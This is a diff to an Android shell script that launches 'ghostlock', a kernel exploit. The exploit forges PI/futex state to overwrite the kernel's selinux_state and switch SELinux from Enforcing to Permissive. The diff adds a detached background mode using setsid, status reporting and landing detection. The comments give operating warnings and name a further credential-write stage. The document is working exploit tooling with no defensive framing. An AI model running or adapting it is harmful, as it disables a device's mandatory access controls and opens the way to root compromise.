@@ -9,25 +9,45 @@
 #   the compiled-in P0_KERNEL_PHYS_LOAD=0xa8000000, which makes the alias of
 #   selinux_state resolve to 0xffffff802b3f9990 on this build).
 #
-# Layout expected next to this script:
-#   /data/local/tmp/gl-w1/ghostlock     (static aarch64 build of src/core)
-#   /data/local/tmp/gl-w1/profile.bin   (the GLK1 profile above)
+# Usage (from adb shell or a device terminal):
+#   sh /data/local/tmp/gl-w1/w1.sh              # background: start, wait for the
+#                                               # store, print the result, EXIT
+#   sh /data/local/tmp/gl-w1/w1.sh --foreground # block here instead (old behaviour)
+#   sh /data/local/tmp/gl-w1/w1.sh --status     # just report state, run nothing
 #
-# WARNINGS -- each of these was measured, not assumed:
+# The script itself returns; the exploit process must stay alive.  It parks after
+# the store ("parking after W1 ... do NOT exit/kill this process") because the
+# kernel's exit-time PI/futex cleanup over the forged waiter wedges the machine.
+#
+# WARNINGS -- each measured, not assumed:
 #   * --profile MUST be an absolute path.  The loader opens the string as-is and
 #     the runtime rewrites HOME, so a relative path fails with
 #     "cannot load resolved profile" even for a perfectly valid GLK1 file.
-#   * The process parks after W1 to keep the forged PI state alive.  Do NOT kill
-#     it: the kernel's exit-time PI/futex cleanup over that forged state wedges
-#     the machine.
+#   * Do NOT kill the parked process (see above); a reboot is the clean way out.
 #   * The effect is NOT persistent: a reboot restores Enforcing.
 #   * On this handset the platform reacts to this activity (observed: the system
-#     was restarted shortly after a landing).  Only run it when that is
-#     acceptable, and never run W2 (cred write) without an explicit decision.
+#     was restarted shortly after a landing).  W2 (cred write) needs an explicit
+#     decision -- never run it just because W1 worked.
 
 DIR=/data/local/tmp/gl-w1
-cd "$DIR" || exit 1
+LOG="$DIR/w1.log"
+MODE=background
 
+case "$1" in
+    --foreground) MODE=foreground ;;
+    --status)     MODE=status ;;
+    "")           ;;
+    *) echo "usage: $0 [--foreground|--status]"; exit 2 ;;
+esac
+
+if [ "$MODE" = "status" ]; then
+    echo "enforce=$(getenforce) ($(cat /sys/fs/selinux/enforce 2>/dev/null))"
+    ps -A 2>/dev/null | grep ghostlock
+    [ -f "$LOG" ] && { echo "--- $LOG (tail) ---"; tail -3 "$LOG"; }
+    exit 0
+fi
+
+cd "$DIR" || exit 1
 export GHOSTLOCK_HOME="$DIR"
 export GHOSTLOCK_W1_ONLY=1
 export GHOSTLOCK_PARK_AFTER_W1=1
@@ -35,7 +55,33 @@ export GHOSTLOCK_MCAST_SOCKET=tcp6
 
 echo "W1: before: enforce=$(getenforce) ($(cat /sys/fs/selinux/enforce))"
 echo "W1: target alias is printed below as 'W1: SELinux target=...'"
-exec ./ghostlock --profile "$DIR/profile.bin"
-# After it lands ("Write 1 complete" + "parking after W1"), check from another
-# shell:  getenforce           -> Permissive
-#         ps -A | grep ghostlock -> the parked process is still there
+
+if [ "$MODE" = "foreground" ]; then
+    exec ./ghostlock --profile "$DIR/profile.bin"      # blocks; parks after W1
+fi
+
+rm -f "$LOG"
+# setsid: the parked process must survive both this shell exiting and an adb
+# disconnect, so it is put in its own session.
+setsid ./ghostlock --profile "$DIR/profile.bin" >"$LOG" 2>&1 &
+PID=$!
+echo "W1: started pid=$PID (logging to $LOG)"
+
+i=0
+while [ $i -lt 90 ]; do                # 90 * 2s = 3 min, the store takes ~11s
+    if grep -q "Write 1 complete" "$LOG" 2>/dev/null; then
+        echo "W1: LANDED -- enforce=$(getenforce) ($(cat /sys/fs/selinux/enforce 2>/dev/null))"
+        echo "W1: parked process is pid=$PID; do NOT kill it (a reboot is the clean exit)"
+        exit 0
+    fi
+    if ! kill -0 "$PID" 2>/dev/null; then
+        echo "W1: process exited WITHOUT landing -- last log lines:"
+        tail -6 "$LOG"
+        exit 1
+    fi
+    sleep 2
+    i=$((i + 1))
+done
+
+echo "W1: still running after 3 min (pid=$PID); see $LOG"
+exit 2
